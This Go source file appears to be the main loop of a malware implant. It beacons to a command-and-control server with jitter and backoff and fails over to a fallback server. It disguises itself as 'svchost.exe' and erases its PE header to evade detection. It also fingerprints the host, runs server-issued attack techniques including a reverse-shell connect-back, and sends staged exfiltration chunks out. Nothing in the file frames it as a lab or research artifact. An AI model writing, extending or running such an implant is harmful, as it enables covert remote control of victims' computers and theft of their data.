package main

import (
	"flag"
	"math/rand"
	"net"
	"os"
	"time"

	"core/mon/internal/config"
	"core/mon/internal/obf"
	"core/mon/internal/protocol"
	"core/mon/internal/ttp"
)

func main() {
	serverAddr := flag.String("server", config.DefaultServer, "C2 server address (host:port)")
	idleInterval := flag.Duration("interval", mustParseDuration(config.DefaultInterval), "idle beacon interval")
	jitter := flag.Float64("jitter", 0.3, "jitter fraction (0.0-1.0)")
	flag.Parse()

	if *serverAddr == "" {
		os.Exit(1)
	}

	_ = ttp.Masquerade("svchost.exe")
	ttp.ErasePEHeader()

	hostname, _ := os.Hostname()
	agentID := protocol.DeriveAgentID(config.SharedSecret, hostname)

	primaryEndpoint := *serverAddr
	emergencyEndpoint := config.FallbackServer

	// Derive relay direct host for TTP 2 revshell connect-back (CDN doesn't proxy :4445)
	rawsockCBAddr := ""
	if config.FallbackServer != "" {
		if fbHost, _, err := net.SplitHostPort(config.FallbackServer); err == nil && fbHost != "" {
			rawsockCBAddr = net.JoinHostPort(fbHost, "9443")
		}
	}

	envReport := ttp.CollectEnvFingerprint(nil)

	if true {
		ttp.JitteredSleep(10*time.Second, 0.5)
	}

	var lastTTP int
	var lastResult, lastError string

	activeEndpoint := primaryEndpoint
	consecutiveFails := 0
	const maxBackoffShift = 6
	maxBackoff := 90 * time.Second

	primaryFails := 0
	const emergencyThreshold = 20

	for {
		endpoints := []string{primaryEndpoint}
		if emergencyEndpoint != "" && primaryFails >= emergencyThreshold {
			endpoints = append(endpoints, emergencyEndpoint)
		}

		var cmd *protocol.Command
		var err error
		cmd, activeEndpoint, err = ttp.BeaconAny(endpoints, agentID, lastTTP, lastResult, lastError, &envReport)
		lastTTP, lastResult, lastError = 0, "", ""

		if err != nil {
			lastError = err.Error()
			consecutiveFails++
			primaryFails++
			shift := consecutiveFails
			if shift > maxBackoffShift {
				shift = maxBackoffShift
			}
			backoff := *idleInterval * time.Duration(1<<uint(shift))
			if backoff > maxBackoff {
				backoff = maxBackoff
			}
			ttp.JitteredSleep(backoff, *jitter)
			continue
		}

		consecutiveFails = 0
		if activeEndpoint == primaryEndpoint {
			primaryFails = 0
		}

		if cmd.TTP != 0 {
			if cmd.Params == obf.D(obf.KillPhrase) {
				os.Exit(0)
			}
			lastTTP = cmd.TTP
			lastResult, err = ttp.Dispatch(cmd.TTP, cmd.Params, activeEndpoint, agentID, config.SharedSecret, rawsockCBAddr)
			if err != nil {
				lastError = err.Error()
				lastResult = ""
			}
			time.Sleep(time.Duration(rand.Intn(5001)) * time.Millisecond)
		} else {
			// Deliver any pending exfil chunk (TTP 32 staged transfer)
			if chunk := ttp.TakePendingExfilChunk(); chunk != "" {
				lastTTP = 32
				lastResult = chunk
			} else {
				ttp.JitteredSleep(*idleInterval, *jitter)
			}
		}
	}
}

// deriveEmergencyHost returns host from fallbackServer for config-derived paths.
func deriveEmergencyHost() string {
	if config.FallbackServer == "" {
		return ""
	}
	h, _, err := net.SplitHostPort(config.FallbackServer)
	if err != nil {
		return config.FallbackServer
	}
	return h
}

func mustParseDuration(s string) time.Duration {
	if s == "" {
		return 30 * time.Second
	}
	d, err := time.ParseDuration(s)
	if err != nil {
		return 30 * time.Second
	}
	return d
}
